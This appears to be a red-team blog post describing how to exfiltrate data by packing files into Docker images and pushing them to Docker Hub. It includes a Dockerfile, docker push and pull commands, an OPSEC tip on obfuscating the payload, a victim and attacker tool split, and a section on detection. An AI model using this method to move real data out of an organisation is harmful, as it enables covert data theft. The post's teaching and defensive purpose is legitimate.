---
title: 'Exfiltrating Information with Docker'
date: '2022-07-02T12:45:01-04:00'
layout: post
author: russell
permalink: /2022/07/exfiltrating-information-with-docker/
image: /assets/uploads/2022/07/dock-worker-ascii.png
tags: [docker, exfiltration, red team, Member Article]
---

# Overview

Mitre ATT&CK calls out **Exfiltration Over Web Service: Exfiltration to Code Repository as technique** [](https://attack.mitre.org/techniques/T1567/001/)<https://attack.mitre.org/techniques/T1567/001/>. While it specifically gives an example of github, I learned about Docker recently and thought this would be a great way to exfiltrate data.

This article is meant to briefly show a method of exfiltration over docker to a docker repository.

- Using Docker to exfiltrate data
- Using Docker Hub here due to the prevalence of using it to pull base docker images to act as the Docker Repository for exfiltration.

Note: If using this for red teaming as target exfiltration, consider using pre-agreed upon junk or generated data to demonstrate exfiltration. It can be encoded in such a way that resembles the target data but still is non-sensitive.

# Basics of Docker

Docker is used to create containers to run and share for common and standardized environments. These are prevalent in CI/CD pipelines within DevOPs.

`docker pull nginx` is a pretty standard command to pull the container from [](https://hub.docker.com/)<https://hub.docker.com/>.

![](/assets/uploads/2022/07/docker-01.png)
*docker pull*

`docker build dockerfileDir/` specifies building with a dockerfile Make sure to make the directory and add your Dockerfile into the directory before building.

![](/assets/uploads/2022/07/docker-02.png)
*docker build output*

`docker image ls` to list the docker images

![](/assets/uploads/2022/07/docker-03.png)
*docker list image output*

`docker image push name[:tag]` to push an image to docker hub or a self-hosted repository.

![](/assets/uploads/2022/07/docker-04.png)
*docker image push output*

# Creating and Exfiltrating the Docker Images

## Single Docker Image

Uses nginx as the base image then copy the data to be exfiltrated into some directory.

```
FROM nginx
COPY file.txt /tmp/
```

> 🥷 OPSEC: The file.txt should be obfuscated and/or encrypted that is normal on the developer machine. For example, .js file endings with heavily obfuscated js code is normal.

Retrieving the Docker image

`docker pull rbtesting4/unloading-data-containers`

NOTE: Don’t forget to use `docker login` to login into the repository

Retrieve the data from the container. This can be done a number of ways, one of the quickest methods for a simple text file will be spawn a shell into the container and display the contents.

![](/assets/uploads/2022/07/docker-05.png)
*spawning a shell into the container and displaying the exfiltrated data*

## Multiple Docker Images (Stacked)

Depending on the amount of data to be exfiltrated, uses multiple tags on the same docker, or layering images might be better than a single image.

Tags are used to unique identify docker images. Often tags are set to version numbers. For exfiltration purposes, tags can be used to identify the sequence of data being exfiltrated.

To do this, add the tag after the colon when pushing to the repository and ensure the dockerfile `COPY` command is pointing to the next bit of data to exfiltrate.

Like `testAccount/testrepository:thisisatagv0.1`. Which has "file2.txt" as the next set of exfiltrated data.

![](/assets/uploads/2022/07/docker-tags.png)
*docker hub showing multiple tags from the same repository*

# Scripting it All Together

Docker has an SDK for python that is well documented. I needed to install it with something like `pip install docker`. This script just automates the process that can absolutely be done but using the native commands.

- Dock-worker load functionality, executes on the victim machine. Confirms by checking docker hub account.

![](/assets/uploads/2022/07/docker-06.png)
*dock-worker load functionality output*

![](/assets/uploads/2022/07/dock-load-edited.png)
*docker hub displays last push*

- Dock-worker unload, used from the attacker perspective to pull the image from the repository and quickly extract the data.

![](/assets/uploads/2022/07/dock-unload.png)
*Uses the results of exec to show the output of the file*

# Detection

When thinking about how I would find a rogue docker hub push, I thought of the follow options:

1. Local logs generated if elevated privileges are needed to connect to the docker.sock, especially if developers have access to this resource anyways. This was discovered used `journalctl -g "docker.sock"`.
2. Network traffic can show the look up of the repository registry, this can be used as an alert if your company uses a different company specific repository for pushing. Using tcpdump, we can seen the query for "A? registry-1.docker.io." and "AAAA? registry-1.docker.io.".

Unfortunately, it looks like communication is over https, so unless a proxy was used throughout the organization, including potential production systems using docker that this would be used on, scanning the data of the traffic would be fairly useless.

![](/assets/uploads/2022/07/docker-netflow-01.png)
*Netflow look at part of initial connection*

![](/assets/uploads/2022/07/docker-netflow-02.png)
*Netflow shows https traffic for the upload of the image*

# Summary

In the right context, exfiltration using docker images to a repository may be a valid and covert way to exfiltrate large amounts of information. While this proof of concept is not ready for production red team usage, a few tweaks to more robustly handle errors, login issues, splitting information over multiple tags, and using existing containers heuristics to blend into the environment.

Hopefully, red teams in this situation will be able to modify this to their needs and blue teams can brainstorm with their dev teams about detective, preventative, and responsive controls to be put in place to not generate hundreds or thousands of legitimate non-malicious events.

# Resources

For creating dock-worker - [](https://docker-py.readthedocs.io/en/stable/index.html)<https://docker-py.readthedocs.io/en/stable/index.html>

For understanding the docker commands - [](https://docs.docker.com/)<https://docs.docker.com/>

dock-worker proof-of-concept code - <https://github.com/rbrins/dock-worker>